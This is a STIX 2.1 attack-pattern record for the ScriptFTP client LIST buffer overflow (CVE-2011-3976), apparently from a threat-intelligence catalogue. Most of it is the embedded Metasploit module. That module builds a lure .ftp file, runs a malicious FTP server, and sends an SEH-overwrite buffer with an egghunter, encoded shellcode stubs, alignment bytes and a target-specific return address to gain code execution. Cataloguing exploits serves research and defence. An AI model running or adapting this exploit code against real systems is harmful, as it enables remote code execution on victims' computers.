{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7385c531-d0c1-4c3f-b546-e2c312a41b64",
    "created": "2024-08-14T16:51:24.591703Z",
    "modified": "2024-08-14T16:51:24.591707Z",
    "name": "ScriptFTP LIST Remote Buffer Overflow",
    "description": " AmmSoft's ScriptFTP client is susceptible to a remote buffer overflow vulnerability that is triggered when processing a sufficiently long filename during a FTP LIST command resulting in overwriting the exception handler. Social engineering of executing a specially crafted ftp file by double click will result in connecting to our malicious server and perform arbitrary code execution which allows the attacker to gain the same rights as the user running ScriptFTP. This vulnerability affects versions 3.3 and earlier.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/scriptftp_list.rb",
            "external_id": "scriptftp_list.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3976"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::FtpServer\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ScriptFTP LIST Remote Buffer Overflow',\n      'Description'    => %q{\n        AmmSoft's ScriptFTP client is susceptible to a remote buffer overflow\n        vulnerability that is triggered when processing a sufficiently long\n        filename during a FTP LIST command resulting in overwriting the\n        exception handler. Social engineering of executing a specially crafted\n        ftp file by double click will result in connecting to our malicious\n        server and perform arbitrary code execution which allows the attacker to\n        gain the same rights as the user running ScriptFTP. This vulnerability\n        affects versions 3.3 and earlier.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'modpr0be', #Vulnerability discovery and original exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module\n          'mr_me <steventhomasseeley[at]gmail.com>',  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-3976' ],\n          [ 'OSVDB', '75633' ],\n          [ 'EDB', '17876' ],\n          [ 'US-CERT-VU', '440219' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'DisablePayloadHandler' => false\n        },\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\\xff\\x0d\\x5c\\x2f\\x0a\",\n          'EncoderType'     => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions'  =>\n          {\n            'BufferRegister' => 'EDI',  # Egghunter jmp edi\n          }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # CALL DWORD PTR SS:[EBP-4]\n          # scriptftp.exe - File version=Build 3/9/2009\n          [ 'Windows XP SP3 / Windows Vista', { 'Offset' => 1746, 'Ret' => \"\\xd6\\x41\" } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-10-12',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        OptString.new('FILENAME',   [ true, 'The file name.',  'msf.ftp']),\n      ])\n\n  end\n\n  def setup\n    if datastore['SRVHOST'] == '0.0.0.0'\n      lhost = Rex::Socket.source_address('50.50.50.50')\n    else\n      lhost = datastore['SRVHOST']\n    end\n\n    ftp_file = \"OPENHOST('#{lhost}','ftp','ftp')\\r\\n\"\n    ftp_file << \"SETPASSIVE(ENABLED)\\r\\n\"\n    ftp_file << \"GETLIST($list,REMOTE_FILES)\\r\\n\"\n    ftp_file << \"CLOSEHOST\\r\\n\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}'...\")\n    file_create(ftp_file)\n    super\n  end\n\n\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n  def on_client_command_list(c,arg)\n\n    conn = establish_data_connection(c)\n    if(not conn)\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n\n    print_status(\" - Data connection set up\")\n    code = 150\n    c.put(\"#{code} Here comes the directory listing.\\r\\n\")\n\n    code = 226\n    c.put(\"#{code} Directory send ok.\\r\\n\")\n\n    eggoptions =\n    {\n      :checksum => false,\n      :eggtag => 'cure'\n    }\n\n    hunter, egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)\n\n    # Encode with alphamixed, then unicode mixed\n    [ 'x86/alpha_mixed', 'x86/unicode_mixed' ].each { |name|\n      enc = framework.encoders.create(name)\n      if name =~ /unicode/\n        # aligned to ESP & EAX\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })\n      else\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EDX' })\n      end\n      # NOTE: we already eliminated badchars\n      hunter = enc.encode(hunter, nil, nil, platform)\n      if name =~/alpha/\n        #insert getpc_stub & align EDX, unicode encoder friendly.\n        #Hardcoded stub is not an issue here because it gets encoded anyway\n        getpc_stub = \"\\x89\\xe1\\xdb\\xcc\\xd9\\x71\\xf4\\x5a\\x83\\xc2\\x41\\x83\\xea\\x35\"\n        hunter = getpc_stub + hunter\n      end\n    }\n\n    unicode_nop = \"\\x6d\" # DD BYTE PTR DS:[ECX],AL\n\n    nseh = \"\\x61\" << unicode_nop\n    seh = target.ret\n\n    alignment = \"\\x54\"  # PUSH ESP\n    alignment << unicode_nop\n    alignment << \"\\x58\"  # POP EAX\n    alignment << unicode_nop\n    alignment << \"\\x05\\x12\\x11\"  # ADD EAX,11001200\n    alignment << unicode_nop\n    alignment << \"\\x2d\\x01\\x01\"  # SUB EAX,1000100\n    alignment << unicode_nop\n    alignment << \"\\x2d\\x01\\x10\"  # SUB EAX,10000100\n    alignment << unicode_nop\n    alignment << \"\\x50\"  # PUSH EAX\n    alignment << unicode_nop\n    alignment << \"\\xc3\"  # RETN\n\n    buffer = rand_text_alpha(656)\n    buffer << hunter\n    buffer << rand_text_alpha(target['Offset']-buffer.length)\n    buffer << nseh\n    buffer << seh\n    buffer << alignment\n    buffer << rand_text_alpha(500)\n    buffer << egg\n\n    print_status(\" - Sending directory list via data connection\")\n    dirlist =  \"-rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\\r\\n\"\n    dirlist << \"   5 ftpuser  ftpusers       512 Jul 26  2001 A\\r\\n\"\n    dirlist << \"rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\\r\\n\"\n\n    conn.put(dirlist)\n    conn.close\n    return\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}